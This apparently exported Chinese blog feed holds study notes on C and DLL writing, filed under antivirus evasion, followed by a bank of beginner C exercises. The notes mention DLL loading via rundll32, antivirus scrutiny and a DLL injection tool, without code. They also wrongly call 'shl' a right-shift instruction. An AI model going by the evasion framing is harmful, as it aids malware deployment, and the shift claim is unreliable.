<p>为什么这两个结构体都是同样的内部变量，但是第一个大小是8第二个大小是12呢？<br>结构体对齐，n为字节对齐，默认为8，可填1、2、4、8，如果n的值比sizeof()得出值小，则已n的值对齐，否则以sizeof()的值对齐，结构体的总大小必须是其最大内部成员的整数倍<br>那怎么改对齐呢，需要使用以下关键字<code>#pragma pack(n)</code>，其中的n就是以n字节对齐，将这个关键字加在定义结构体的struct关键字前面（然后所有的结构体都已这个n对齐）</p>
<p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107223101109.png" alt="image-20240107223101109"></p>
<h1 id="dll编写"><a href="#dll编写" class="headerlink" title="dll编写"></a>dll编写</h1><h2 id="多线程调试dll方式编译和默认编译的区别"><a href="#多线程调试dll方式编译和默认编译的区别" class="headerlink" title="多线程调试dll方式编译和默认编译的区别"></a>多线程调试dll方式编译和默认编译的区别</h2><p>怎么改这个呢，ctest属性页-c/c++-代码生成-运行库</p>
<p>1.默认的小，多线程的大<br>2.默认的编译，不会将当前程序的dll打包进去，而多线程dll也不会把你的dll打包进去。<br><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107225929798.png" alt="image-20240107225929798"><br>所以使用上图中多线程这种方式，将所有的dll打宝进去，就不会出现各种错误了。</p>
<p>所以基本上都用多线程就行。</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107230403739.png" alt="image-20240107230403739"></p>
<p>而dll里面那些api，都是3环东东西，然后一层一层调用，进入到0环也就是内核去实现功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0环：内核层  .sys</span><br><span class="line">3环：用户层  .exe</span><br></pre></td></tr></table></figure>

<h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107232804445.png" alt="image-20240107232804445"></p>
<p>1.一开始的程序是不会调用所有dll的，如果需要调用的话，需要用LoadLibrary这个函数来调用</p>
<h2 id="加载的地一种方式"><a href="#加载的地一种方式" class="headerlink" title="加载的地一种方式"></a>加载的地一种方式</h2><p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107234543458.png" alt="image-20240107234543458"></p>
<p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107234205370.png" alt="image-20240107234205370"></p>
<p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107234215510.png" alt="image-20240107234215510"></p>
<p>上面这个东西，也就是dll被加载的时候就会弹窗</p>
<h2 id="加载的第二种方式"><a href="#加载的第二种方式" class="headerlink" title="加载的第二种方式"></a>加载的第二种方式</h2><p>用rundll32来调用，</p>
<p><img src="/2024/01/07/C%E8%AF%AD%E8%A8%802-%E6%95%B0%E7%BB%84%E3%80%81%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93%E3%80%81dll%E7%BC%96%E5%86%99/image-20240107234342834.png" alt="image-20240107234342834"></p>
<p>但是呢，这个东西被杀软查的非常严格，除非你写的dll是面纱的，要不然不行。</p>
<h2 id="procexp-exe"><a href="#procexp-exe" class="headerlink" title="procexp.exe"></a>procexp.exe</h2><p>这个东西可以看所有进程加载的dll，而且也是微软官方的</p>
<h2 id="remotedll"><a href="#remotedll" class="headerlink" title="remotedll"></a>remotedll</h2><p>这个是个可以注入dll的东西，32位的就只能用32位的dll。</p>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p>汇编指令扩展：<br>shl  右移指令</p>
<p>当一个dll被加载的时候，是不能对这个dll进行读写的</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>C语言大题题库1</title>
    <url>/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/</url>
    <content><![CDATA[<h1 id="C语言大题题库1"><a href="#C语言大题题库1" class="headerlink" title="C语言大题题库1"></a>C语言大题题库1</h1><p>题库内容过多，为了避免博客篇章过长，我将会分成多篇博客上传。</p>
<h1 id="读四个数，计算，格式输出"><a href="#读四个数，计算，格式输出" class="headerlink" title="读四个数，计算，格式输出"></a>读四个数，计算，格式输出</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231005151459814.png" alt="image-20231005151459814"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">double</span> num1, num2,num3,num4;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入四个数：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lf%lf%lf%lf&quot;</span>, &amp;num1, &amp;num2, &amp;num3, &amp;num4);</span><br><span class="line">	<span class="keyword">double</span> result;</span><br><span class="line">	result = (((<span class="keyword">int</span>)num1 % (<span class="keyword">int</span>)num2) * num3) + num4;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n计算结果为：%016.7f&quot;</span>, result);</span><br><span class="line">	<span class="comment">//计算结果的输出格式为 %016.7f。这表示总宽度为16个字符，其中包含小数点以及小数点后面的7位数字。</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//结果和图中一样</span></span><br></pre></td></tr></table></figure>

<h1 id="华氏温度转摄制温度"><a href="#华氏温度转摄制温度" class="headerlink" title="华氏温度转摄制温度"></a>华氏温度转摄制温度</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231005152600514.png" alt="image-20231005152600514"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入华氏温度：&quot;</span>);</span><br><span class="line">	<span class="keyword">double</span> F,C;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;F);<span class="comment">//读取float用f，double（双精数浮点数）时用lf</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%f&quot;</span>, F);</span><br><span class="line">	C = (<span class="number">5</span> * (F - <span class="number">32</span>))/<span class="number">9</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nF(%f)=C(%f)&quot;</span>, F, C);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//结果和图中一样</span></span><br></pre></td></tr></table></figure>

<h1 id="小写字符输出ascii与转大写"><a href="#小写字符输出ascii与转大写" class="headerlink" title="小写字符输出ascii与转大写"></a>小写字符输出ascii与转大写</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231005153338166.png" alt="image-20231005153338166"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个小写字母：&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> input,result;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;input);</span><br><span class="line">	<span class="keyword">int</span> gap;</span><br><span class="line">	gap = <span class="string">&#x27;a&#x27;</span> - <span class="string">&#x27;A&#x27;</span>;<span class="comment">//注意，小写的ascii是大于大写的</span></span><br><span class="line">	result = input - gap;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, gap);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%c(%d)&quot;</span>, input, input);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%c(%d)&quot;</span>, result, result);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//输出和题目一样</span></span><br></pre></td></tr></table></figure>

<h1 id="求圆的周长面积，圆柱体积"><a href="#求圆的周长面积，圆柱体积" class="headerlink" title="求圆的周长面积，圆柱体积"></a>求圆的周长面积，圆柱体积</h1><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/一些笔记\c语言\C语言大题题库1\image-20231005155213170.png" alt="image-20231005155213170" style="zoom:150%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入r=,h=：&quot;</span>);</span><br><span class="line">	<span class="keyword">double</span> r, h;</span><br><span class="line">	<span class="keyword">double</span> C, S, V;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;r=%lf,h=%lf&quot;</span>, &amp;r, &amp;h);</span><br><span class="line">	C = <span class="number">6.28</span> * r;</span><br><span class="line">	S = r * r * <span class="number">3.14</span>;</span><br><span class="line">	V = S * h;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nC1=%.2lf\nS=%.2lf\nV=%.2lf&quot;</span>, C, S, V);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//基础问题，不过scanf按格式输入值得注意</span></span><br><span class="line"><span class="comment">//有些我觉得有讲究的就会放出运行图</span></span><br><span class="line"><span class="comment">//其他的结果我都是运行过的，和题目的例子几乎一样</span></span><br></pre></td></tr></table></figure>



<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231005155658493.png" alt="image-20231005155658493"></p>
<h1 id="输入年月日-处理后输出"><a href="#输入年月日-处理后输出" class="headerlink" title="输入年月日 处理后输出"></a>输入年月日 处理后输出</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231006150908628.png" alt="image-20231006150908628"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> Y, M, D;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;Y, &amp;M, &amp;D);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%02d/%02d&quot;</span>,Y,M,D);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231006151539513.png" alt="image-20231006151539513"></p>
<h1 id="读字符，输出ascii的十六进制"><a href="#读字符，输出ascii的十六进制" class="headerlink" title="读字符，输出ascii的十六进制"></a>读字符，输出ascii的十六进制</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231006152011370.png" alt="image-20231006152011370"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> inp;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个字符：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;inp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nAscii(&#x27;%c&#x27;) = 0x%X&quot;</span>, inp,inp);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="输入正整数，逆序输出"><a href="#输入正整数，逆序输出" class="headerlink" title="输入正整数，逆序输出"></a>输入正整数，逆序输出</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231006152342820.png" alt="image-20231006152342820"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> in;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个正整数：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;in);</span><br><span class="line">	<span class="keyword">if</span> (in &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入正整数&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> ge;</span><br><span class="line">		ge = in % <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">int</span> shi;</span><br><span class="line">		shi = (in / <span class="number">10</span>) % <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">int</span> bai;</span><br><span class="line">		bai = (in / <span class="number">100</span>) % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> result;</span><br><span class="line">		result = ge * <span class="number">100</span> + shi * <span class="number">10</span> + bai;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;结果是：%03d&quot;</span>, result);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="读字符，范围输出"><a href="#读字符，范围输出" class="headerlink" title="读字符，范围输出"></a>读字符，范围输出</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231006154648740.png" alt="image-20231006154648740"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> forth, lower;</span><br><span class="line">	<span class="keyword">int</span> gap;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入两个字符:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c%c&quot;</span>, &amp;forth, &amp;lower);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (forth &gt; lower) &#123;</span><br><span class="line">		gap = forth - lower;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= gap; i++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, lower + i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (forth &lt; lower) &#123;</span><br><span class="line">		gap = lower - forth;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= gap; i++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, forth + i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, forth);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231006154702134.png" alt="image-20231006154702134"></p>
<p>我的更好，我能判断大小捏！</p>
<h1 id="输入三角形边长，算面积，根号"><a href="#输入三角形边长，算面积，根号" class="headerlink" title="输入三角形边长，算面积，根号"></a>输入三角形边长，算面积，根号</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231007211957366.png" alt="image-20231007211957366"></p>
<p>这次的程序涉及到了根号的运算，难上加难了哈</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span><span class="comment">//sqrt求根号需要用到</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a, b, c;</span><br><span class="line">	<span class="keyword">double</span> p, q;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入三角形的三个边长：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">	<span class="keyword">if</span> ((a + b &gt; c) &amp;&amp; (a + c &gt; b) &amp;&amp; (b + c &gt; a)) &#123;</span><br><span class="line">		p = (a + b + c) / (<span class="keyword">double</span>)<span class="number">2</span>;</span><br><span class="line">		q = (<span class="built_in">sqrt</span>(p * (p - a) * (p - b) * (p - c)));<span class="comment">//求根函数</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n面积为:%lf&quot;</span>, q);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n请输入正确的三角形&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="输入三个整数，输出绝对值最大的"><a href="#输入三个整数，输出绝对值最大的" class="headerlink" title="输入三个整数，输出绝对值最大的"></a>输入三个整数，输出绝对值最大的</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231007212908310.png" alt="image-20231007212908310"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入三个整数：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">3</span>],arr2[<span class="number">3</span>];<span class="comment">//第二个数组用来存储绝对值之后的数组1</span></span><br><span class="line">    <span class="comment">//随后用索引的方式来存储绝对值最大的</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;arr[<span class="number">0</span>], &amp;arr[<span class="number">1</span>], &amp;arr[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">int</span> max = arr[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">int</span> max_index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		arr2[i] = arr[i];</span><br><span class="line">		<span class="keyword">if</span> (arr[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			arr2[i] = -arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (arr2[i] &gt; max) &#123;</span><br><span class="line">			max = arr2[i];</span><br><span class="line">			max_index = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n绝对值最大数是：%d&quot;</span>, arr[max_index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题有意思，我还想了一会。</p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231007214236159.png" alt="image-20231007214236159"></p>
<h1 id="根据输入输出特定矩阵"><a href="#根据输入输出特定矩阵" class="headerlink" title="根据输入输出特定矩阵"></a>根据输入输出特定矩阵</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231007214536718.png" alt="image-20231007214536718"></p>
<p>有意思，第一瞬间没想到思路，故写一下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个整数：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> a,arr[<span class="number">5</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	arr[<span class="number">0</span>] = a;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">		arr[i] = a + i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>, arr[i]+j);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231007215050632.png" alt="image-20231007215050632"></p>
<p>我是编程天才吗</p>
<h1 id="判断是否是回文"><a href="#判断是否是回文" class="headerlink" title="判断是否是回文"></a>判断是否是回文</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010205253868.png" alt="image-20231010205253868"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010205258083.png" alt="image-20231010205258083"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个字符串：&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	gets_s(str);</span><br><span class="line">	len = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">int</span> j = len<span class="number">-1</span>;<span class="comment">//用来遍历从后往前</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (str[i] == str[j]) &#123;</span><br><span class="line">			j--;<span class="comment">//从后往前</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n不是回文&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n是回文&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010210425387.png" alt="image-20231010210425387"></p>
<h1 id="立方和等于规定num"><a href="#立方和等于规定num" class="headerlink" title="立方和等于规定num"></a>立方和等于规定num</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010210547670.png" alt="image-20231010210547670"></p>
